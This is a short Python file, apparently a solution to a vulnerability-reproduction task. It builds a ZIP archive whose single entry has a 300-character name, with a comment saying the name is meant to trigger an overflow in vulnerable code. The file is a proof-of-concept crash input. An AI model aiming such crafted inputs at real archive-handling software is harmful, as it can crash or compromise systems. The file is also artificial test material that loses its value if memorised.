import io
import zipfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        long_name = "A" * 300  # > 256 to trigger overflow in vulnerable code
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_STORED) as zf:
            zf.writestr(long_name, b"X", compress_type=zipfile.ZIP_STORED)
        return buf.getvalue()
